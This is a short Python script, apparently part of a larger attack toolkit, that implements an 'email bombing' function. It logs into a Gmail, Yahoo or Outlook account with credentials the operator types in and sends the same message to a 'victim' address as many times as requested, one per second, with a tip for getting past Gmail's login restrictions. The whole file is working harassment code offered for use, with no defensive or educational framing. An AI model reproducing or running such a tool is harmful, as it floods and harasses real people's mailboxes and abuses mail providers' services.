import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def emailbombing():
    print("    |-----------------------------------------------------------")
    
    sender_email = input("    |-$ Your Email > ")
    sender_password = input("    |-$ Your Password > ")
    victim_email = input("    |-$ Victim's Email > ")
    subject = input("    |-$ Subject > ")
    message = input("    |-$ Message > ")
    
    try:
        repcount = int(input('    |-$ How many times ? > '))
    except ValueError:
        print('    |-$ Invalid number')
        return
    
    if "@gmail.com" in sender_email:
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
    elif "@yahoo.com" in sender_email:
        smtp_server = "smtp.mail.yahoo.com"
        smtp_port = 587
    elif "@outlook.com" in sender_email or "@hotmail.com" in sender_email:
        smtp_server = "smtp.office365.com"
        smtp_port = 587
    else:
        print("    |-$ Unsupported provider")
        return
    
    print("    |-$ Sending...")
    
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        
        for i in range(repcount):
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = victim_email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(message, 'plain'))
            
            server.send_message(msg)
            print(f'    |-$ {i+1}/{repcount} sent')
            time.sleep(1)
        
        server.quit()
        print('    |-} Done')
        
    except Exception as e:
        print(f'    |-$ Error')
        print('    |-$ For Gmail: Enable "Less secure apps" or use App Password')
    
    print("    |-----------------------------------------------------------")